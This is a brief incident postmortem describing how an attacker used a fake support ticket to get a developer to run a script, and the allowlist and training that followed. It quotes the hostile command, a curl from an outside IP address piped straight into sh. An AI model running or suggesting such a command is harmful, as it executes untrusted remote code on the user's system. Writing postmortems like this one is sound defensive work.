# Incident 2026-09 postmortem (summary)

- An attacker got a developer to run `curl http://203.0.113.77/x | sh` from a fake support ticket.
- Fix: added an allowlist for install scripts and training for the support team.
- Lesson: never run scripts from tickets without review.
